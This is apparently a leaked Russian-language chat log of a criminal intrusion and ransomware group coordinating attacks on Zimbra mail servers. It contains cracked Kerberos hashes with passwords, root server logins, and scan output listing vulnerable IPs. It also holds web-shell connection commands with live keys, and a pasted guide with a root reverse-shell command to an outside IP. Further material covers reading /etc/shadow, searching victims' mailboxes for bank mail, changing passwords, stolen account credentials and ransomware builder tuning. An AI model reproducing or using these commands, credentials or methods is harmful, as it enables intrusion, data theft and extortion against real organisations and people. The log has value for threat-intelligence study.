@@ -1,0 +1,2340 @@
+[2024-04-05 03:45:08] @usernamehunter:matrix.bestflowers247.online: > <@usernamess:matrix.bestflowers247.online> sent a file.
+
+$krb5tgs$23$*kfreema$DCWAS.DS.SJHS.COM$dcwas.DS.SJHS.COM/kfreema*$f984e5bf875.......4e104df:Kfsecret22!
+
+--------------------
+[2024-04-05 03:46:27] @usernamehunter:matrix.bestflowers247.online: > <@usernamess:matrix.bestflowers247.online> sent a file.
+
+$krb5tgs$23$*cfservice$FLPEN.DS.SJHS.COM$FLPEN.DS.SJHS.COM/cfservice*$afb030a1d9bedbd0.......3ab294451e24c067:CFsvc2010
+
+--------------------
+[2024-04-05 03:47:24] @usernamehunter:matrix.bestflowers247.online: > <@usernamess:matrix.bestflowers247.online> sent a file.
+
+$krb5tgs$23$*ehrsqldbe$FLPEN.DS.SJHS.COM$FLPEN.DS.SJHS.COM/ehrsqldbe*$eb33c4adff189e8c27.....f983fb2744aa:*@support99
+
+--------------------
+[2024-04-05 06:39:03] @usernamess:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 07:06:51] @usernamett:matrix.bestflowers247.online: `185.219.221.136:37701  MASCARO`
+--------------------
+[2024-04-05 07:07:20] @usernamett:matrix.bestflowers247.online: `64.176.219.106:40917   MASCARO`
+--------------------
+[2024-04-05 07:08:28] @usernamett:matrix.bestflowers247.online: `64.176.219.106:41025  MASCARO`
+--------------------
+[2024-04-05 07:09:14] @usernamess:matrix.bestflowers247.online: > <@usernamett:matrix.bestflowers247.online> `64.176.219.106:40917   MASCARO`
+
+видит дц
+--------------------
+[2024-04-05 07:09:15] @usernamett:matrix.bestflowers247.online: 185.219.221.136:38289
+--------------------
+[2024-04-05 07:40:58] @n3auxaxl:matrix.collectionofmanager.space: Привет, занимаюсь дальше, щас попытаюсь разобраться, есть еще 1 вид сплойта
+--------------------
+[2024-04-05 07:41:12] @n3auxaxl:matrix.collectionofmanager.space: надо отправлять письмо с .ra архивом
+--------------------
+[2024-04-05 07:41:23] @n3auxaxl:matrix.collectionofmanager.space: и когда его будет zimbra проверять на вирусы, он тоже распаковывается
+--------------------
+[2024-04-05 07:41:28] @usernamegg:matrix.bestflowers247.online: привет
+--------------------
+[2024-04-05 07:41:57] @usernamegg:matrix.bestflowers247.online: > <@n3auxaxl:matrix.collectionofmanager.space> и когда его будет zimbra проверять на вирусы, он тоже распаковывается
+
+и он выполняется когда открывается ?
+--------------------
+[2024-04-05 07:43:16] @usernamegg:matrix.bestflowers247.online: [18:25:52] Th1nkAb0ut: Сплойт не продам
+[18:26:16] Th1nkAb0ut: Доступы больше 1Б пока не нашел
+--------------------
+[2024-04-05 07:43:30] @n3auxaxl:matrix.collectionofmanager.space: > <@usernamegg:matrix.bestflowers247.online> и он выполняется когда открывается ?
+
+нет
+--------------------
+[2024-04-05 07:43:34] @n3auxaxl:matrix.collectionofmanager.space: его открывать не надо
+--------------------
+[2024-04-05 07:43:56] @n3auxaxl:matrix.collectionofmanager.space: > <@usernamegg:matrix.bestflowers247.online> [18:25:52] Th1nkAb0ut: Сплойт не продам
+> [18:26:16] Th1nkAb0ut: Доступы больше 1Б пока не нашел
+
+ага, видимо у них другой
+--------------------
+[2024-04-05 07:47:08] @n3auxaxl:matrix.collectionofmanager.space: > <@usernamegg:matrix.bestflowers247.online> shodan и фофа -- https://oshi.at/UVps
+
+щас я поставлю на скан это
+--------------------
+[2024-04-05 07:47:24] @n3auxaxl:matrix.collectionofmanager.space: полностью все отсканим
+--------------------
+[2024-04-05 07:47:26] @n3auxaxl:matrix.collectionofmanager.space: получим, то что нам подходжит
+--------------------
+[2024-04-05 07:47:39] @n3auxaxl:matrix.collectionofmanager.space: и попробую пробить их все
+--------------------
+[2024-04-05 07:52:12] @usernamegg:matrix.bestflowers247.online: ок
+--------------------
+[2024-04-05 07:52:38] @usernamegg:matrix.bestflowers247.online: через сколько по времени будет результат
+--------------------
+[2024-04-05 07:52:39] @usernamegg:matrix.bestflowers247.online: ?
+--------------------
+[2024-04-05 07:53:07] @n3auxaxl:matrix.collectionofmanager.space: > <@usernamegg:matrix.bestflowers247.online> через сколько по времени будет результат
+
+скана или когда пробью имеешь ввиду?
+--------------------
+[2024-04-05 07:54:56] @n3auxaxl:matrix.collectionofmanager.space: базу сделал на скан
+--------------------
+[2024-04-05 07:55:18] @n3auxaxl:matrix.collectionofmanager.space: 92887 уникальных IP
+--------------------
+[2024-04-05 07:55:21] @n3auxaxl:matrix.collectionofmanager.space: * 92887 уникальных IP:PORT
+--------------------
+[2024-04-05 07:56:35] @usernamecc:matrix.bestflowers247.online: ---
+--------------------
+[2024-04-05 07:56:39] @usernamecc:matrix.bestflowers247.online: `hymer-alu.de`
+--------------------
+[2024-04-05 07:56:49] @usernamecc:matrix.bestflowers247.online: страничку для блога надо сделать
+--------------------
+[2024-04-05 08:02:00] @usernamegg:matrix.bestflowers247.online: ```
+hymer-alu.de
+
+id:c3904dcc-b305-4b83-ade4-02b0c8cfe32f
+```
+--------------------
+[2024-04-05 08:02:02] @usernamecc:matrix.bestflowers247.online: * `hymer-alu.de (id:c3904dcc-b305-4b83-ade4-02b0c8cfe32f)`
+--------------------
+[2024-04-05 08:21:08] @n3auxaxl:matrix.collectionofmanager.space: ```
+IP: 2.57.149.20 port 22196
+login: root
+pass2: Dx&8THDdS2vF1sD{RP@_H7Z
+
+```
+--------------------
+[2024-04-05 08:21:11] @n3auxaxl:matrix.collectionofmanager.space: а этот сервак уже все?
+--------------------
+[2024-04-05 08:21:23] @n3auxaxl:matrix.collectionofmanager.space: я просто с него хотел запустить скан
+--------------------
+[2024-04-05 08:21:45] @n3auxaxl:matrix.collectionofmanager.space: да, не пускает
+--------------------
+[2024-04-05 08:37:37] @usernameyy:matrix.bestflowers247.online: esxi нужен для тестов
+--------------------
+[2024-04-05 08:37:55] @usernameyy:matrix.bestflowers247.online: я на линуксе оттестирую обычно, но на всякий случай было бы неплохр
+--------------------
+[2024-04-05 08:37:58] @usernameyy:matrix.bestflowers247.online: * я на линуксе оттестирую обычно, но на всякий случай было бы неплохо
+--------------------
+[2024-04-05 08:42:30] @n3auxaxl:matrix.collectionofmanager.space: чуть чуть переписал чекер, теперь все намного проще должно работать и вывод норм,Ю сразу с версией идет
+--------------------
+[2024-04-05 08:42:36] @n3auxaxl:matrix.collectionofmanager.space: ```
+04:51:28 | SUCCESS | [VULNERABLE][TARGET: 38.143.106.12:8443] Version[9.0.0_GA_4258] - Release[20220324053424]
+04:51:29 | SUCCESS | [VULNERABLE][TARGET: 12.145.20.55:80] Version[8.6.0_GA_1242] - Release[20190402060140]
+04:51:29 | SUCCESS | [VULNERABLE][TARGET: 38.143.106.12] Version[9.0.0_GA_4258] - Release[20220324053424]
+04:51:30 | SUCCESS | [VULNERABLE][TARGET: 12.145.20.55] Version[8.6.0_GA_1242] - Release[20190402060140]
+04:51:30 | SUCCESS | [VULNERABLE][TARGET: 38.143.106.10:8443] Version[9.0.0_GA_4258] - Release[20220324053424]
+04:51:30 | SUCCESS | [VULNERABLE][TARGET: 12.145.20.55:7071] Version[8.6.0_GA_1242] - Release[20190402060140]
+04:51:36 | SUCCESS | [VULNERABLE][TARGET: 12.190.170.77:7071] Version[8.0.5_GA_5839] - Release[20130910124124]
+04:51:41 | SUCCESS | [VULNERABLE][TARGET: 69.89.10.151] Version[8.0.4_GA_5737] - Release[20130524120036]
+04:51:41 | SUCCESS | [VULNERABLE][TARGET: 69.89.10.151:7071] Version[8.0.4_GA_5737] - Release[20130524120036]
+04:51:43 | SUCCESS | [VULNERABLE][TARGET: 38.143.106.10] Version[9.0.0_GA_4258] - Release[20220324053424]
+```
+--------------------
+[2024-04-05 08:43:08] @n3auxaxl:matrix.collectionofmanager.space: мне надо чисто сервак для скана, чтобы запустить
+--------------------
+[2024-04-05 08:43:10] @n3auxaxl:matrix.collectionofmanager.space: и все
+--------------------
+[2024-04-05 08:43:14] @n3auxaxl:matrix.collectionofmanager.space: так в целом все готово
+--------------------
+[2024-04-05 08:49:53] @usernameyy:matrix.bestflowers247.online: все билдеры готовы, сейчас начинаю тестирование
+--------------------
+[2024-04-05 09:02:23] @usernamegg:matrix.bestflowers247.online: отлично
+--------------------
+[2024-04-05 09:02:33] @usernamegg:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> esxi нужен для тестов
+
+найдем сейчас
+--------------------
+[2024-04-05 09:24:15] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-04-05 09:25:12] @lapa:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> sent a file.
+
+называет корпы, но там вообщне не корпы)
+--------------------
+[2024-04-05 09:25:23] @lapa:matrix.bestflowers247.online: comcast.net, charter.net
+--------------------
+[2024-04-05 09:34:26] @usernameyy:matrix.bestflowers247.online: по локальным тестам всё норм
+--------------------
+[2024-04-05 09:34:45] @lapa:matrix.bestflowers247.online: SONIC_VALID.txt
+--------------------
+[2024-04-05 09:34:49] @lapa:matrix.bestflowers247.online: FORTI_VALID.txt
+--------------------
+[2024-04-05 09:34:49] @lapa:matrix.bestflowers247.online: AUTH_VALID.txt
+--------------------
+[2024-04-05 09:34:56] @lapa:matrix.bestflowers247.online: VALID_BRUT_CISCO.txt
+--------------------
+[2024-04-05 09:34:56] @lapa:matrix.bestflowers247.online: VALID_BRUT_SONIC.txt
+--------------------
+[2024-04-05 09:34:57] @lapa:matrix.bestflowers247.online: VALID_BRUT_RDWEB.txt
+--------------------
+[2024-04-05 09:45:52] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 09:45:54] @usernamegg:matrix.bestflowers247.online: доброе
+--------------------
+[2024-04-05 09:50:12] @lapa:matrix.bestflowers247.online: добавлю еще третий сервер под брут
+--------------------
+[2024-04-05 09:50:37] @lapa:matrix.bestflowers247.online: потому что смотрю, бывают поменты, когда вылетает таймаут при подключении к бд
+--------------------
+[2024-04-05 09:50:47] @lapa:matrix.bestflowers247.online: вроде как не хватает свободных портов
+--------------------
+[2024-04-05 09:51:01] @lapa:matrix.bestflowers247.online: короч с брутом мучение)
+--------------------
+[2024-04-05 09:51:13] @lapa:matrix.bestflowers247.online: 
+max workers threads
+460922
+number of running workers threads
+117026
+--------------------
+[2024-04-05 09:51:26] @lapa:matrix.bestflowers247.online: еще по идеи должно было 460к потоков
+--------------------
+[2024-04-05 09:51:31] @lapa:matrix.bestflowers247.online: но запущено 117к
+--------------------
+[2024-04-05 09:51:45] @lapa:matrix.bestflowers247.online: но это уже нужно на сипанельке проверять
+--------------------
+[2024-04-05 09:51:51] @lapa:matrix.bestflowers247.online: почему так
+--------------------
+[2024-04-05 09:52:14] @usernameugway:matrix.bestflowers247.online: привет
+--------------------
+[2024-04-05 09:52:17] @usernameugway:matrix.bestflowers247.online: итого пришло 5шт вчера
+--------------------
+[2024-04-05 09:53:08] @usernameugway:matrix.bestflowers247.online: 2 - не корпа
+1 - ООН
+1 - без пароля
+1 - безопасник
+
+
+--------------------
+[2024-04-05 09:53:09] @usernameugway:matrix.bestflowers247.online: -----
+--------------------
+[2024-04-05 09:55:19] @usernameugway:matrix.bestflowers247.online: мы можем отправить по моей базе?
+--------------------
+[2024-04-05 09:57:30] @lapa:matrix.bestflowers247.online: но все равно, ошибок намного меньше, чем было
+--------------------
+[2024-04-05 09:57:52] @lapa:matrix.bestflowers247.online: но нужно, чтобы их вообще ноль было
+--------------------
+[2024-04-05 09:59:34] @usernamegg:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> короч с брутом мучение)
+
+да, z gjyzk e;t
+--------------------
+[2024-04-05 09:59:42] @usernamegg:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> короч с брутом мучение)
+
+* да, я понял уже
+--------------------
+[2024-04-05 10:00:09] @usernamegg:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> но все равно, ошибок намного меньше, чем было
+
+это уже радует
+--------------------
+[2024-04-05 10:00:15] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 10:00:53] @usernameugway:matrix.bestflowers247.online: и 1000 переходов с 23к
+--------------------
+[2024-04-05 10:00:58] @usernamegg:matrix.bestflowers247.online: нет, я не могу по твоей мне надо спамилку перестраивать
+--------------------
+[2024-04-05 10:01:04] @usernamegg:matrix.bestflowers247.online: я не шлю чисто по почтам это бред
+--------------------
+[2024-04-05 10:01:14] @usernamegg:matrix.bestflowers247.online: сейчас пока некогда
+--------------------
+[2024-04-05 10:01:26] @usernameugway:matrix.bestflowers247.online: ты в реплаи? или какая схема
+--------------------
+[2024-04-05 10:01:39] @usernamegg:matrix.bestflowers247.online: да ответами
+--------------------
+[2024-04-05 10:02:19] @usernamegg:matrix.bestflowers247.online: SONIC_VALID.txt
+--------------------
+[2024-04-05 10:02:23] @usernamegg:matrix.bestflowers247.online: FORTI_VALID.txt
+--------------------
+[2024-04-05 10:02:24] @usernameugway:matrix.bestflowers247.online: понял
+--------------------
+[2024-04-05 10:02:28] @usernamegg:matrix.bestflowers247.online: AUTH_VALID.txt
+--------------------
+[2024-04-05 10:02:33] @usernamegg:matrix.bestflowers247.online: VALID_BRUT_CISCO.txt
+--------------------
+[2024-04-05 10:02:53] @usernamegg:matrix.bestflowers247.online: VALID_BRUT_SONIC.txt
+--------------------
+[2024-04-05 10:02:59] @usernamegg:matrix.bestflowers247.online: VALID_BRUT_RDWEB.txt
+--------------------
+[2024-04-05 10:09:28] @usernameugway:matrix.bestflowers247.online: до пнд внесу правки, потом еще разок попробуем
+--------------------
+[2024-04-05 10:09:36] @usernameugway:matrix.bestflowers247.online: получилось у етбя с эксплойтом?
+--------------------
+[2024-04-05 10:14:04] @usernamegg:matrix.bestflowers247.online: сейчас
+--------------------
+[2024-04-05 10:14:11] @usernamegg:matrix.bestflowers247.online: какой еще сервак можно взять ?
+--------------------
+[2024-04-05 10:14:13] @usernamegg:matrix.bestflowers247.online: можешь скинуть ?
+--------------------
+[2024-04-05 10:14:20] @usernamegg:matrix.bestflowers247.online: ты тут ?
+--------------------
+[2024-04-05 10:14:45] @usernamegg:matrix.bestflowers247.online: какая версия в итоге уязвима ?
+--------------------
+[2024-04-05 10:15:14] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-04-05 10:15:16] @lapa:matrix.bestflowers247.online: скоро
+--------------------
+[2024-04-05 10:15:20] @n3auxaxl:matrix.collectionofmanager.space: sek
+--------------------
+[2024-04-05 10:15:29] @usernamegg:matrix.bestflowers247.online: 8.6.0
+--------------------
+[2024-04-05 10:15:47] @lapa:matrix.bestflowers247.online: IP: 2.57.149.21 port 22196
+login: root
+pass2: Dx&8THDdS2vF1sD{RP@_H7Z
+--------------------
+[2024-04-05 10:16:06] @usernamegg:matrix.bestflowers247.online: IP: 2.57.149.21 port 22196
+login: root
+pass2: Dx&8THDdS2vF1sD{RP@_H7Z
+--------------------
+[2024-04-05 10:17:30] @n3auxaxl:matrix.collectionofmanager.space: +++
+--------------------
+[2024-04-05 10:18:17] @n3auxaxl:matrix.collectionofmanager.space: Zimbra Collaboration Suite Network Edition 9.0.0 Patch 23 (and earlier)
+Zimbra Collaboration Suite Network Edition 8.8.15 Patch 30 (and earlier)
+--------------------
+[2024-04-05 10:18:22] @n3auxaxl:matrix.collectionofmanager.space: вот все до этого патчка
+--------------------
+[2024-04-05 10:19:51] @usernamegg:matrix.bestflowers247.online: понял
+--------------------
+[2024-04-05 10:19:53] @usernamegg:matrix.bestflowers247.online: ну запускай
+--------------------
+[2024-04-05 10:20:04] @n3auxaxl:matrix.collectionofmanager.space: ofc djn ltkf.
+--------------------
+[2024-04-05 10:20:07] @n3auxaxl:matrix.collectionofmanager.space: щас вот делаю
+--------------------
+[2024-04-05 10:20:22] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 10:26:28] @n3auxaxl:matrix.collectionofmanager.space: запустил
+--------------------
+[2024-04-05 10:27:35] @n3auxaxl:matrix.collectionofmanager.space: gj dthcbzv gj[jle ,tlf
+--------------------
+[2024-04-05 10:27:40] @n3auxaxl:matrix.collectionofmanager.space: по версиям походу беда
+--------------------
+[2024-04-05 10:27:44] @n3auxaxl:matrix.collectionofmanager.space: из-за этого пробить не могли
+--------------------
+[2024-04-05 10:27:59] @n3auxaxl:matrix.collectionofmanager.space: ```
+13:25:00.298 | SUCCESS  | [TARGET: 138.201.97.33:80] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+13:25:00.645 | SUCCESS  | [TARGET: 136.243.142.197:443] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+13:25:05.216 | SUCCESS  | [TARGET: 138.201.97.33:443] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+13:25:06.249 | SUCCESS  | [TARGET: 138.201.97.33:8443] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+13:25:08.125 | SUCCESS  | [TARGET: 136.243.142.197:80] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+13:25:20.271 | SUCCESS  | [TARGET: 81.169.239.140:443] - !!!VULNERABLE!!! - Version[9.0.0_GA_4204] - Release[20220121011741]
+13:25:20.725 | SUCCESS  | [TARGET: 136.243.142.197:8443] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+13:25:33.125 | SUCCESS  | [TARGET: 136.243.142.197:8080] - !!!VULNERABLE!!! - Version[9.0.1_GA_${zimbra.buildinfo.buildnum}.root] - Release[root]
+```
+--------------------
+[2024-04-05 10:28:07] @n3auxaxl:matrix.collectionofmanager.space: пока только 1, которая реально может быть уязвима
+--------------------
+[2024-04-05 10:44:30] @n3auxaxl:matrix.collectionofmanager.space: вот еще что
+--------------------
+[2024-04-05 10:44:38] @n3auxaxl:matrix.collectionofmanager.space: Note: Although the public advisories don't mention it, our testing indicated that Zimbra Collaboration Suite Network Edition (the paid edition) is vulnerable, and the Open Source Edition (free) is not (since it does not have the vulnerable mboximport endpoint). Vulnerable versions are:
+--------------------
+[2024-04-05 10:44:48] @n3auxaxl:matrix.collectionofmanager.space: только Network Edition уязвимы)
+--------------------
+[2024-04-05 10:44:59] @n3auxaxl:matrix.collectionofmanager.space: то есть Open Source нет
+--------------------
+[2024-04-05 10:59:08] @n3auxaxl:matrix.collectionofmanager.space: щас досканит, я буду смотреть
+--------------------
+[2024-04-05 10:59:10] @n3auxaxl:matrix.collectionofmanager.space: пытаться пробить пару
+--------------------
+[2024-04-05 10:59:54] @n3auxaxl:matrix.collectionofmanager.space: половина уже есть
+--------------------
+[2024-04-05 11:07:37] @manager361:colorado.su: Hello
+--------------------
+[2024-04-05 11:08:27] @manager880:colorado.su: Are you ready to work?
+--------------------
+[2024-04-05 11:12:46] @usernamegg:matrix.bestflowers247.online: половина отсканилась ?
+--------------------
+[2024-04-05 11:13:14] @n3auxaxl:matrix.collectionofmanager.space: да
+--------------------
+[2024-04-05 11:13:18] @n3auxaxl:matrix.collectionofmanager.space: щас уже больше
+--------------------
+[2024-04-05 11:13:48] @n3auxaxl:matrix.collectionofmanager.space: щас думаю как детектить именно network edition
+--------------------
+[2024-04-05 11:14:54] @n3auxaxl:matrix.collectionofmanager.space: 70 процентов уже готово
+--------------------
+[2024-04-05 11:17:28] @n3auxaxl:matrix.collectionofmanager.space: 113 уникальных есть, котоыре должны быть по идее уязвимсы
+--------------------
+[2024-04-05 11:26:00] @usernameyy:matrix.bestflowers247.online: так решил доработать
+--------------------
+[2024-04-05 11:26:32] @usernameyy:matrix.bestflowers247.online: итого я заменил chacha20 (8 nonce) на chacha20-poly1305 (12nonce) и ecc на rsa 2048
+--------------------
+[2024-04-05 11:26:45] @usernameyy:matrix.bestflowers247.online: чуть более криптостойкая чача короче
+--------------------
+[2024-04-05 11:28:43] @usernameyy:matrix.bestflowers247.online: в билдеры залил, из выпадающего списка BB4
+--------------------
+[2024-04-05 11:28:54] @usernameyy:matrix.bestflowers247.online: по умолчанию пока не ставлю, затестим где нибудь
+--------------------
+[2024-04-05 11:29:20] @usernamegg:matrix.bestflowers247.online: shell.py
+--------------------
+[2024-04-05 11:30:02] @usernamegg:matrix.bestflowers247.online: ```
+[19:30:11] Th1nkAb0ut: Общение с доступом удобнее всего через мой питон скрипт, там ничего нет, он не большой, можно быстро проверить.
+
+Подключение к шелу:
+python3 shell.py --base_url="zimbraAdmin/public/jsp" --web_shell_filename="ZimbraAdmin.jsp" --key vbptxxwjdxsfrgzgeudtfffawmbcbhcx --target https://ip host
+У сервера есть таймаут, поэтому, если запускать через него что-то, что будет работать долго, то вариант запустить, с выводом в файл и потом прочитать резуольтат. Удобнее через реверс шелл работать.
+
+Полезные команды:
+рутовый реверс шелл:
+reverse 11.22.33.255 3434 /usr/lib/sftp
+на принимающем сервере nc -lvp 3439
+
+выполнить из под рута из шела:
+/usr/lib/sftp -p -c "cat /etc/shadow"
+
+посмотреть все аккаунты:
+/opt/zimbra/bin/zmprov -l gaa
+
+поиск внутри аккаунта:
+/opt/zimbra/bin/zmmailbox -z -m user@domain.com s -t message -l 10 "in:Inbox From:@binance.com"
+
+[19:30:12] Th1nkAb0ut: язык поисковых запросов https://wiki.zimbra.com/wiki/Zimbra_Web_Client_Search_Tips
+
+Можно в цикле запустить
+for account in `/opt/zimbra/bin/zmprov -l gaa`; do echo $account; /opt/zimbra/bin/zmmailbox -z -m $account s -t message -l 10 "in:Inbox AND content:(pncbank.com OR svb.com OR truist.com OR bankofthewest.com)"; done
+
+вывод сообщения по айди:
+/opt/zimbra/bin/zmmailbox -z -m user@domain.com gm 1661 -
+
+Получить хеш пароля:
+/opt/zimbra/bin/zmprov -l ga "user@domain.com" userPassword
+
+Изменить пароль:
+/opt/zimbra/bin/zmprov sp user@domain.com 123qqq12
+
+Вернуть пароль на первоначальный:
+/opt/zimbra/bin/zmprov -l ma user@domain.com userPassword "{SSHA512}Y4msQuKsBxTOgZFnxmbstqI5KhQ61EetTHjS0vxi0UT2lm/PQ4jG0X8VqUzedNYlUz3OZJs+OMaXpKC/c/1rq7ycTwL1FKPY"
+
+
+Если совсем страшно моим скриптом пользоваться - там все просто, можно самому накидать автоматизацию.
+Вот пример общения через curl, где JCMD - команда в base64, которая исполняется в терминале. JSESSIONID - ключ в base64 (--key)
+```
+
+--------------------
+[2024-04-05 11:30:25] @usernamegg:matrix.bestflowers247.online: ```
+python3 shell.py --base_url="zimbraAdmin/public/jsp" --web_shell_filename="ZimbraAdmin.jsp" --key kdlfxddzqwyahctlqjwapaisiudnqsgh --target https://213.47.213.243
+
+python3 shell.py --base_url="zimbraAdmin/public/jsp" --web_shell_filename="ZimbraAdmin.jsp" --key ksjaubznombzbryfsyewchgoebkwrire --target https://103.106.237.84
+```
+
+--------------------
+[2024-04-05 11:30:34] @usernamegg:matrix.bestflowers247.online: вот два доступа
+--------------------
+[2024-04-05 11:47:51] @usernamess:matrix.bestflowers247.online: `mailsrv.erm-consult.com`
+--------------------
+[2024-04-05 11:48:17] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 11:48:22] @usernamess:matrix.bestflowers247.online: `213.47.213.243`
+--------------------
+[2024-04-05 11:48:24] @usernamegg:matrix.bestflowers247.online: пасс поменяй кому нибудь
+--------------------
+[2024-04-05 11:51:46] @usernamess:matrix.bestflowers247.online: `admin@mailsrv2.erm-consult.com P@ssw0rd`
+--------------------
+[2024-04-05 11:52:18] @usernamess:matrix.bestflowers247.online: `admin@snowaction.at P@ssw0rd_Password`
+--------------------
+[2024-04-05 11:54:57] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-04-05 11:55:53] @usernamess:matrix.bestflowers247.online: `cims@erm-consult.com P@ssw0rd_Password\`
+--------------------
+[2024-04-05 11:57:17] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-04-05 в 14.57.09.png
+--------------------
+[2024-04-05 11:57:45] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2024-04-05 в 14.57.40.png
+--------------------
+[2024-04-05 11:58:01] @usernamegg:matrix.bestflowers247.online: пусто у него на почте
+--------------------
+[2024-04-05 11:58:03] @usernamegg:matrix.bestflowers247.online: нету ничего
+--------------------
+[2024-04-05 11:58:23] @usernamegg:matrix.bestflowers247.online: я про первого
+--------------------
+[2024-04-05 11:58:33] @usernamess:matrix.bestflowers247.online: я понял
+--------------------
+[2024-04-05 11:59:16] @usernamegg:matrix.bestflowers247.online: второй тоже пустой
+--------------------
+[2024-04-05 11:59:31] @usernamegg:matrix.bestflowers247.online: но у каждого почта по раному наполнена
+--------------------
+[2024-04-05 12:00:24] @usernamegg:matrix.bestflowers247.online: > <@usernamess:matrix.bestflowers247.online> `cims@erm-consult.com P@ssw0rd_Password\`
+
+целачка вообще почта
+--------------------
+[2024-04-05 12:03:23] @usernamess:matrix.bestflowers247.online: `office@erm-consult.com P@ssw0rd_Password`
+--------------------
+[2024-04-05 12:04:04] @n3auxaxl:matrix.collectionofmanager.space: ну что то да пробивает походу
+--------------------
+[2024-04-05 12:04:17] @n3auxaxl:matrix.collectionofmanager.space: скоро скину тебе список того что пробило
+--------------------
+[2024-04-05 12:05:26] @usernamess:matrix.bestflowers247.online: `loredana.lahounik@backup4u.at P@ssw0rd_Password`
+--------------------
+[2024-04-05 12:08:46] @usernamegg:matrix.bestflowers247.online: admin@mailsrv2.erm-consult.com P@ssw0rd
+admin@snowaction.at P@ssw0rd_Password
+office@erm-consult.com P@ssw0rd_Password
+loredana.lahounik@backup4u.at P@ssw0rd_Password
+--------------------
+[2024-04-05 12:09:04] @usernamegg:matrix.bestflowers247.online: https://213.47.213.243
+--------------------
+[2024-04-05 12:09:51] @usernamegg:matrix.bestflowers247.online: zimbra
+--------------------
+[2024-04-05 12:09:56] @usernamegg:matrix.bestflowers247.online: admin@mailsrv2.erm-consult.com P@ssw0rd
+admin@snowaction.at P@ssw0rd_Password
+office@erm-consult.com P@ssw0rd_Password
+loredana.lahounik@backup4u.at P@ssw0rd_Password
+https://213.47.213.243
+--------------------
+[2024-04-05 12:10:02] @usernamegg:matrix.bestflowers247.online: вот еще доступ
+--------------------
+[2024-04-05 12:10:19] @usernamegg:matrix.bestflowers247.online: я зашел туда на почту
+--------------------
+[2024-04-05 12:10:52] @n3auxaxl:matrix.collectionofmanager.space: +++
+--------------------
+[2024-04-05 12:11:33] @n3auxaxl:matrix.collectionofmanager.space: щас я разберусь с проилом нормальным
+--------------------
+[2024-04-05 12:11:54] @n3auxaxl:matrix.collectionofmanager.space: и отпишу
+--------------------
+[2024-04-05 12:12:10] @n3auxaxl:matrix.collectionofmanager.space: > <@usernamegg:matrix.bestflowers247.online> admin@mailsrv2.erm-consult.com P@ssw0rd
+> admin@snowaction.at P@ssw0rd_Password
+> office@erm-consult.com P@ssw0rd_Password
+> loredana.lahounik@backup4u.at P@ssw0rd_Password
+> https://213.47.213.243
+
+на шел какой пасс?
+--------------------
+[2024-04-05 12:12:41] @n3auxaxl:matrix.collectionofmanager.space: та же команда запуска?
+--------------------
+[2024-04-05 12:15:52] @lapa:matrix.bestflowers247.online: так это вы им просто сбросили мыло и пасс
+--------------------
+[2024-04-05 12:15:55] @lapa:matrix.bestflowers247.online: они заметят
+--------------------
+[2024-04-05 12:16:05] @lapa:matrix.bestflowers247.online: там через шелл как я понял можно смотреть письма
+--------------------
+[2024-04-05 12:16:13] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-04-05 12:16:14] @lapa:matrix.bestflowers247.online: без сброса пасса
+--------------------
+[2024-04-05 12:16:15] @usernamegg:matrix.bestflowers247.online: конечно
+--------------------
+[2024-04-05 12:16:32] @usernamegg:matrix.bestflowers247.online: я смотрел пароли там возмодные и тд
+--------------------
+[2024-04-05 12:16:37] @usernamegg:matrix.bestflowers247.online: сейчас подняли сокс
+--------------------
+[2024-04-05 12:17:26] @lapa:matrix.bestflowers247.online: ну их как понял пока мало у вас? так бы можно мне было письма повыкачивать
+--------------------
+[2024-04-05 12:18:27] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-04-05 12:18:33] @usernamegg:matrix.bestflowers247.online: пока вообще мало
+--------------------
+[2024-04-05 12:18:43] @usernamegg:matrix.bestflowers247.online: 3 доступа и то что тот чел дал
+--------------------
+[2024-04-05 12:41:33] @usernamegg:matrix.bestflowers247.online: от второй сетки надо юзером
+--------------------
+[2024-04-05 12:41:35] @usernamegg:matrix.bestflowers247.online: пассы помменять
+--------------------
+[2024-04-05 12:41:36] @usernamegg:matrix.bestflowers247.online: JJ
+--------------------
+[2024-04-05 12:41:42] @usernamegg:matrix.bestflowers247.online: и давай веб посмотрим
+--------------------
+[2024-04-05 12:41:48] @usernamegg:matrix.bestflowers247.online: `python3 shell.py --base_url="zimbraAdmin/public/jsp" --web_shell_filename="ZimbraAdmin.jsp" --key acspslnplzrdxpgddmcbrsktkatsdknj --target https://103.247.226.208`
+--------------------
+[2024-04-05 12:41:52] @usernamegg:matrix.bestflowers247.online: вот следующий доступ
+--------------------
+[2024-04-05 12:41:54] @usernamegg:matrix.bestflowers247.online: новый
+--------------------
+[2024-04-05 12:43:52] @usernamess:matrix.bestflowers247.online: ```
+SMB         192.168.11.5    445    KUBA5            [*] Windows 10 Pro 22631 (name:KUBA5) (domain:KUBA5) (signing:False) (SMBv1:True)
+SMB         192.168.11.10   445    KUBASAVE         [*] Windows 6.1 (name:KUBASAVE) (domain:KUBASAVE) (signing:False) (SMBv1:True)
